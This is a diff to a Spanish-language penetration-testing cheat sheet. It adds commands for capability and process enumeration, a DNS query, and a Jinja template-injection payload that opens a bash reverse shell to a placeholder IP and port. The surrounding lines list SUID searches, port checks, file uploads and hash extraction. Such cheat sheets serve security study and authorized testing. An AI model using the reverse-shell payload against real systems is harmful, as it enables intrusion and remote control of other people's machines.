@@ -14,6 +14,10 @@ find / -perm -4000 2>/dev/null [busca en todo el sistema archivos con privilegio
 
 find / -perm -u=s -type f 2>/dev/null [busca archivos en todo el sistema que tienen el bit setuid activado, lo que significa que cuando se ejecutan lo hacen con los privilegios del propietario]
 
+/sbin/getcap -r / 2>/dev/null [busca todos los archivos del sistema que tengan Linux capabilities asignadas, ocultando los errores de acceso]
+
+ps -eaf [muestra una lista detallada de los procesos del sistema]
+
 ltrace ./archivo [muestra en tiempo real las funciones de biblioteca que un programa llama mientras se ejecuta]
 
 nc -zv ip (puerto) [verifica si un puerto está abierto en un host]
@@ -51,6 +55,8 @@ binwalk -e (archivo ) [escanea un archivo binario en busca de datos incrustados 
 strings (archivo) [extrae las cadenas de texto de un archivo]
 
 python3 -c 'import pty;pty.spawn("/bin/bash");' [para invocar una shell si esta python3 instalado]
+
+{% import os %}{{os.system('bash -c "bash -i >& /dev/tcp/IP/PUERTO 0>&1"')}} [si se codifica en url puede actuar como shell reversa disfrazado con plantilla de tipo Jinja] 
 
 ip a [linux] / ipconfig [windows] [averiguar ip de nuestro dispositivo]
 
@@ -103,6 +109,8 @@ curl -v -X OPTIONS (ip o url) [realiza una solicitud OPTIONS a un sitio web]
 curl -T archivo (ip/dir/archivo) --http1.0 [sirve para subir un archivo a un servidor web usando el método HTTP PUT bajo la versión HTTP/1.0]
 
 enum4linux (IP) [enumera usuarios, grupos, recursos compartidos SMB, políticas y más en sistemas Windows/Samba]
+
+dig (dominio.com) @(ip) [hace una consulta DNS al servidor de nombres especificado por ip, preguntando por los registros del dominio]
 
 zip2john archivo.zip > otroarchivo.zip [extrae el hash de la contraseña del archivo ZIP para que pueda ser crackeado por John the Ripper]
 
